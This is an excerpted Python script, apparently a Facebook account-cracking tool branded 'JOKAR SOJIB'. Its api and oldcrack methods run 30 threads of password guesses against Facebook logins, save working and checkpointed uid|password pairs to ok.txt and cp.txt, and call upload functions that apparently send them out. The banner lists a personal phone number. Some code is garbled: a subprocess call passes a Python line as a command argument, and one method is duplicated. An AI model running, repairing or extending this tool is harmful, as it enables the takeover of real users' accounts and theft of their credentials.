...
def helpnote():
	...
	subprocess.check_output(["am", "start", "plr = requests.get('https://github.com/Jok4rsoj1b4/Files-make-4/blob/main/X-JOKAR.txt').text"])
	exit(" [*] FACEBOOK :  JOKAR SOJIB ")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰JOKAR SOJIB")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Jok4rsoj1b4/Files-make-4/blob/main/X-JOKAR.txt').text
			if basesplit in plr:
				key = basesplit
	...
	Muzamil khod banay ga ak din command tansion ni lyni 
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : JOKAR-SOJIB 
\033[1;91m [\033[1;94m✓\033[1;91m]
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : JOK4R -SOJ1B4
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01609859866
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def oldcrack(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD JOKAR SOJIB 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
	...
	def oldcrack(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD JOKAR143-  6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: SOJIB): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [JOK4R_OLD] : %s/%s -> \033[0;92m [ JOK4R-OK:%s ]- \033[0;91m[JOK4R-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[JOK4R-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [JOK4R-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[JOK4R-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [JOK4R-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
